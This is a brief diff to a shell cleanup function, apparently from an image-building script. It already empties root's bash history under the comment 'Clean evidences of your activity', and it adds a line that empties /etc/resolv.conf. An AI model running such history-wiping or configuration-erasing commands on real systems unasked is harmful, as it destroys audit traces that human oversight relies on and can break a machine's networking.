@@ -52,6 +52,9 @@ clean_garbage()
 
 	# Clean evidences of your activity
 	echo -n > /root/.bash_history
+
+	# Clean /etc/resolv.conf
+	echo -n > /etc/resolv.conf
 }
 
 clean_garbage
